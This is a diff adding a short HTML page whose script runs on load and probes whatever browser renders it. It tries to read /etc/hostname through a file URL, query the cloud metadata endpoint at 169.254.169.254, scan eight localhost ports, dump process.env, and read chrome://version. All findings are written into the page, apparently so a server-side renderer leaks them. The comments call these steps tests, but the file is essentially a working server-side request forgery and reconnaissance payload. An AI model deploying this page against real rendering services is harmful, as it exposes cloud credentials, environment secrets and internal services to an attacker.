@@ -1,0 +1,54 @@
+  <!DOCTYPE html>
+  <html>
+  <body>
+  <div id="results">STATIC_NO_JS</div>
+  <script>
+  async function scan() {
+    const results = [];
+
+    // Test 1: JS execution proof
+    results.push('JS_EXECUTED: true');
+    results.push('USER_AGENT: ' + navigator.userAgent);
+    results.push('LOCATION: ' + window.location.href);
+
+    // Test 2: Try to read local files
+    try {
+      const f = await fetch('file:///etc/hostname');
+      const t = await f.text();
+      results.push('HOSTNAME: ' + t);
+    } catch(e) { results.push('file_hostname: ' + e.message); }
+
+    // Test 3: Try metadata from inside Chrome
+    try {
+      const r = await fetch('http://169.254.169.254/latest/meta-data/');
+      const t = await r.text();
+      results.push('METADATA: ' + t);
+    } catch(e) { results.push('metadata: ' + e.message); }
+
+    // Test 4: Scan localhost ports
+    const ports = [80, 443, 3000, 5000, 8080, 8443, 9200, 27017];
+    for (const port of ports) {
+      try {
+        const r = await fetch('http://127.0.0.1:' + port + '/', {mode: 'no-cors'});
+        results.push('PORT_' + port + ': OPEN (status ' + r.status + ')');
+      } catch(e) { results.push('PORT_' + port + ': ' + e.message); }
+    }
+
+    // Test 5: Environment variables (Node.js only)
+    try {
+      results.push('ENV: ' + JSON.stringify(process.env));
+    } catch(e) {}
+
+    // Test 6: Chrome internals
+    try {
+      const r = await fetch('chrome://version');
+      const t = await r.text();
+      results.push('CHROME_VERSION: ' + t.substring(0, 500));
+    } catch(e) { results.push('chrome_version: ' + e.message); }
+
+    document.getElementById('results').innerText = results.join('\n');
+  }
+  scan();
+  </script>
+  </body>
+  </html>
